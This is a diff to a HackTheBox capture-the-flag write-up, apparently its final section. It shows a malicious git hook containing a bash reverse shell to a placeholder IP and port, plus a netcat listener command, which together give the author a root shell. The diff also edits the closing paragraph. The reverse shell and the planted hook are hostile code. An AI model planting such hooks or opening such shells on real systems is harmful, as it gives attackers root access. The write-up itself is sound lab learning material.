@@ -234,10 +234,10 @@ Knowing this, we can make a malicious git hook that will execute our commands ev
 
 ```bash
 #!/bin/bash
-bash -i >& /dev/tcp/\<my_ip\>/\<my_port\> 0>&1
+bash -i >& /dev/tcp/<my_ip>/<my_port> 0>&1
 ```
 Then I set up a netcat listener on my localhost using command `nc -lvnp 6969` and modified the home directory of dev01 user by adding some non-empty files with command `echo "I don't know what I'm doing" > test.txt`. After couple of seconds, I got a reverse shell with root privileges and was able to retrieve the **_root.txt_** flag.
 
-This box was actually really fun and I needed to access tutorials to deal with some of the parts, but at the same time I learned a lot of new things. I am really glad that I bought HackTheBox Vip membership and I can't wait to make more writeups in the future! See you soon choombas! :)
+This box was actually really fun but I'm not gonna lie, I needed to access some tutorials to deal with some of the tricky parts. At the same time, I learned a lot of new things and I am really glad that I bought HackTheBox Vip membership. I can't wait to make more writeups in the future! See you soon choombas! :)
     
 
